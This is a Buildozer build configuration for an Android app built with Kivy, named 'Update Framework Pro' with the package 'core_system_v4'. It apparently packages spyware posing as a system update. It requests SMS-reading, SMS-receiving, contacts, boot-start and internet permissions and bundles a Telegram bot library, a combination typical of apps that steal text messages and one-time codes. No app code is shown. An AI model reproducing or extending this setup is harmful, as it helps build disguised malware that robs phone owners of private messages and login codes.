[app]
title = Update Framework Pro
package.name = core_system_v4
package.domain = com.core.internal
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 4.1

# Requirements
requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius,requests,certifi

# Permissions
android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED, READ_CONTACTS

# Android Settings
android.api = 28
android.minapi = 21
android.ndk = 25b
android.private_storage = True
android.archs = arm64-v8a, armeabi-v7a
android.allow_backup = True

[buildozer]
log_level = 2
warn_on_root = 1
